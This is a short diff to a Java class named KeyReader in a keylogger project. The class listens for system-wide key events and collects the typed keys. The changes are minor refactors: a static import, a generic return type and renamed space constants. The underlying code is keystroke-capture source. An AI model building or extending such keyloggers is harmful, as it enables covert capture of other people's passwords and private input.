@@ -2,6 +2,8 @@ package com.mossad.keylogger.reader;
 
 import com.mmigdal.mossad.key.logger.library.KeyLoggerEntries;
 
+import static kisonar.platform.domain.BaseDefinitions.*;
+
 import java.util.ArrayList;
 import java.util.List;
 
@@ -30,7 +32,7 @@ public class KeyReader implements NativeKeyListener {
     public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
     }
 
-    public List getCollectedKeys() {
+    public List<String> getCollectedKeys() {
         List<String> result = new ArrayList<>(readSigns);
         readSigns.clear();
         return result;
@@ -42,7 +44,7 @@ public class KeyReader implements NativeKeyListener {
         if (keyPressed) {
 
             if (isSpace(keyText)) {
-                keyText = KeyLoggerEntries.SIGN_SPACE;
+                keyText = SPACE;
             }
 
             if (isShift(keyText)) {
@@ -59,7 +61,7 @@ public class KeyReader implements NativeKeyListener {
     }
 
     private String generateShiftEntry(String entry) {
-        return new StringBuilder().append(KeyLoggerEntries.SIGN_SPACE).append(entry).append(KeyLoggerEntries.SIGN_SPACE)
+        return new StringBuilder().append(SPACE).append(entry).append(SPACE)
                 .toString();
     }
 
